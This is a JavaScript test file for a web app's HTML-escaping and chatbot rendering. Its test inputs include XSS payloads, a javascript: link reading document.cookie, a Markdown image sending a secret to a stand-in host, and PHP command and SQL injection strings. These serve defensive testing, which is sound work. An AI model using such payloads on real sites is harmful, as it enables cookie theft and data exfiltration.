import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { test } from 'node:test';
import vm from 'node:vm';

const read = path => readFileSync(new URL('../' + path, import.meta.url), 'utf8');
const payload = '<img src=x onerror="alert(1)"><script>alert(2)</script>';
const escaped = '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;';

test('chatbot output and copied drafts never interpret HTML, Markdown images, links or scripts', () => {
    const messages = [];
    const createdTags = [];
    const description = { value: '', dispatchEvent() {}, focus() {} };
    const sandbox = vm.createContext({
        aiMessages: { appendChild: value => messages.push(value), scrollTop: 0, scrollHeight: 100 },
        document: {
            createElement(tag) {
                createdTags.push(tag);
                return {
                    children: [], events: {},
                    appendChild(value) { this.children.push(value); },
                    addEventListener(type, listener) { this.events[type] = listener; },
                    set innerHTML(value) { throw new Error('Chatbot must not use innerHTML'); },
                };
            },
            querySelector: () => description,
        },
        Event: class {},
        setAiPanel() {},
        fetch() { throw new Error('Answer must not fetch links'); },
    });
    const source = read('resources/views/pelapor/lapor.blade.php');
    const start = source.indexOf('        function appendAiMessage(');
    const end = source.indexOf('        async function askAi(', start);
    assert.ok(start >= 0 && end > start);
    vm.runInContext(source.slice(start, end), sandbox);
    for (const attack of [
        payload,
        '![leak](https://evil.test/collect?secret=example)',
        '[Masuk](javascript:alert(document.cookie))',
        '</script><script>alert(1)</script>',
        'DROP TABLE reports; <?php system("id"); ?>',
    ]) {
        sandbox.appendAiMessage(attack, 'model', true);
        const bubble = messages.at(-1);
        assert.equal(bubble.children[0].textContent, attack);
        bubble.children[1].events.click();
        assert.equal(description.value, attack);
    }
    assert.ok(createdTags.every(tag => ['div', 'p', 'button'].includes(tag)));
});

function context(values = {}) {
    const elements = new Map();
    const sandbox = vm.createContext({
        ...values,
        document: {
            getElementById(id) {
                if (!elements.has(id)) elements.set(id, {
                    innerHTML: '', textContent: '', classList: { add() {}, remove() {} },
                });
                return elements.get(id);
            },
        },
    });
    sandbox.window = sandbox;
    vm.runInContext(read('public/js/html-safety.js'), sandbox);
    return sandbox;
}

function runFunction(sandbox, path, name, nextMarker) {
    const source = read(path);
    const start = source.indexOf('    function ' + name + '(');
    const end = source.indexOf(nextMarker, start);
    assert.ok(start >= 0 && end > start, 'Rendering function must be present');
    vm.runInContext(source.slice(start, end) + '\n' + name + '();', sandbox);
}

test('HTML encoding preserves text and blocks tag and quoted-attribute injection', () => {
    const sandbox = context();
    assert.equal(sandbox.escapeHtml(payload), escaped);
    assert.equal(sandbox.escapeHtml('" autofocus onfocus="alert(1)'), '&quot; autofocus onfocus=&quot;alert(1)');
    assert.equal(sandbox.escapeHtml("O'Reilly & café"), 'O&#39;Reilly &amp; café');
    assert.equal(sandbox.escapeHtml(null), '');
});

test('dashboard audit descriptions and actor names remain text at the HTML sink', () => {
    const sandbox = context({
        databaseLogs: [{ aksi: payload, user: payload, waktu: payload }],
        jenisClass: () => 'safe-class', iconJenis: () => 'description',
    });
    runFunction(sandbox, 'resources/views/super_admin/dashboard.blade.php', 'renderLogs', '    renderLogs();');
    const html = sandbox.document.getElementById('log-list').innerHTML;
    assert.ok(!html.includes(payload));
    assert.equal(html.split(escaped).length - 1, 3);
});

test('account list encodes every database-provided text field', () => {
    const users = [{ nama: payload, email: payload, username: payload, dibuat: payload, status: 'active', role: 'admin' }];
    const sandbox = context({ getUsers: () => users, filtered: values => values, statusClass: () => 'safe-class' });
    runFunction(sandbox, 'resources/views/super_admin/user.blade.php', 'renderList', '    function bukaTambah');
    const html = sandbox.document.getElementById('user-list').innerHTML;
    assert.ok(!html.includes(payload));
    assert.equal(html.split(escaped).length - 1, 4);
});

test('public report list encodes description, location, code and time', () => {
    const reports = [{ lokasi: payload, deskripsi: payload, kode: payload, waktu: payload, statusIdx: 0 }];
    const sandbox = context({
        getReports: () => reports, filterReports: () => reports,
        displayedReports: [], badgeClass: () => 'safe-class', labelStatus: () => 'Dikirim',
    });
    runFunction(sandbox, 'resources/views/pelapor/status.blade.php', 'renderList', '    let displayedReports');
    const html = sandbox.document.getElementById('report-list').innerHTML;
    assert.ok(!html.includes(payload));
    assert.equal(html.split(escaped).length - 1, 4);
});

for (const role of ['admin', 'super_admin']) {
    test(role + ' export loader sets integrity and permits retry after network or integrity failure', async () => {
        const scripts = [];
        let removed = 0;
        const sandbox = context();
        sandbox.document.querySelector = () => null;
        sandbox.document.createElement = () => ({ remove() { removed++; } });
        sandbox.document.head = { appendChild(script) { scripts.push(script); } };
        const source = read('resources/views/admin/kegiatan.blade.php');
        const start = source.indexOf('            const loadScript =');
        const end = source.indexOf('            const dateLabel =', start);
        assert.ok(start >= 0 && end > start);
        vm.runInContext(source.slice(start, end).replace('const loadScript =', 'globalThis.loadScript ='), sandbox);
        const failed = sandbox.loadScript('https://example.test/library.js', 'sha384-test');
        assert.equal(scripts[0].integrity, 'sha384-test');
        assert.equal(scripts[0].crossOrigin, 'anonymous');
        scripts[0].onerror();
        await assert.rejects(failed, /pustaka/i);
        assert.equal(removed, 1);
        const retried = sandbox.loadScript('https://example.test/library.js', 'sha384-test');
        scripts[1].onload();
        await retried;
        assert.equal(scripts.length, 2);
    });
}
